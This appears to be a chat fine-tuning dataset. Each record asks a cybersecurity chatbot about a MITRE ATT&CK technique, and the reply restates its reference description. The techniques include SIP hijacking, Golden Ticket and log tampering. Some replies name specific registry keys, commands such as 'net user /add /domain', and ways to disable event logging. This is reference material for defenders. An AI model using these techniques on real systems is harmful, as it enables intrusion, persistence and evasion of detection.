{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SIP and Trust Provider Hijacking' and with the Id: T1198 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SIP and Trust Provider Hijacking' and with the Id: T1198 is described as follows: In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)Similar to [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Account Discovery' and with the Id: T1087 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Account Discovery' and with the Id: T1087 is described as follows: Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.For examples, cloud environments typically provide easily accessible interfaces to obtain user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.. The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Proxy' and with the Id: T1090 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Proxy' and with the Id: T1090 is described as follows: Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Command and Scripting Interpreter' and with the Id: T1059 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Command and Scripting Interpreter' and with the Id: T1059 is described as follows: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network, Office 365, Azure AD, IaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Indicator Blocking' and with the Id: T1562.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Indicator Blocking' and with the Id: T1562.006 is described as follows: An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).For example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) ETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck).. The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Account' and with the Id: T1136.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Account' and with the Id: T1136.002 is described as follows: Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999)Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.. The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Employee Names' and with the Id: T1589.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Employee Names' and with the Id: T1589.003 is described as follows: Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Trust Discovery' and with the Id: T1482 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Trust Discovery' and with the Id: T1482 is described as follows: Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Golden Ticket' and with the Id: T1558.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Golden Ticket' and with the Id: T1558.001 is described as follows: Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Component Object Model and Distributed COM' and with the Id: T1175 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Component Object Model and Distributed COM' and with the Id: T1175 is described as follows: **This technique has been deprecated. Please use [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Component Object Model](https://attack.mitre.org/techniques/T1559/001).**Adversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. COM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.Adversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)Adversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Automated Exfiltration' and with the Id: T1020 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Automated Exfiltration' and with the Id: T1020 is described as follows: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.(Citation: ESET Gamaredon June 2020) When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Client Configurations' and with the Id: T1592.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Client Configurations' and with the Id: T1592.004 is described as follows: Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disable or Modify Cloud Firewall' and with the Id: T1562.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disable or Modify Cloud Firewall' and with the Id: T1562.007 is described as follows: Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).(Citation: Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.. The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Right-to-Left Override' and with the Id: T1036.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Right-to-Left Override' and with the Id: T1036.002 is described as follows: Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malware' and with the Id: T1588.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malware' and with the Id: T1588.001 is described as follows: Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Component Firmware' and with the Id: T1542.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Component Firmware' and with the Id: T1542.002 is described as follows: Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.. The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Indicator Removal' and with the Id: T1070 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Indicator Removal' and with the Id: T1070 is described as follows: Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Containers, Network, Office 365, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Symmetric Encrypted Non-C2 Protocol' and with the Id: T1048.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Symmetric Encrypted Non-C2 Protocol' and with the Id: T1048.001 is described as follows: Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Office Template Macros' and with the Id: T1137.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Office Template Macros' and with the Id: T1137.001 is described as follows: Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) Word Normal.dotm location:<br><code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>Excel Personal.xlsb location:<br><code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.. The systems targeted by this attack pattern are: Windows, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Virtual Private Server' and with the Id: T1583.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Virtual Private Server' and with the Id: T1583.003 is described as follows: Adversaries may rent Virtual Private Servers (VPSs)\u00a0that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Confluence' and with the Id: T1213.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Confluence' and with the Id: T1213.001 is described as follows: Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:* Policies, procedures, and standards* Physical / logical network diagrams* System architecture diagrams* Technical system documentation* Testing / development credentials* Work / project schedules* Source code snippets* Links to network shares and other internal resources. The systems targeted by this attack pattern are: SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Pass the Ticket' and with the Id: T1550.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Pass the Ticket' and with the Id: T1550.003 is described as follows: Adversaries may \u201cpass the ticket\u201d using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Container Administration Command' and with the Id: T1609 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Container Administration Command' and with the Id: T1609 is described as follows: Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell). The systems targeted by this attack pattern are: Containers ."}]}
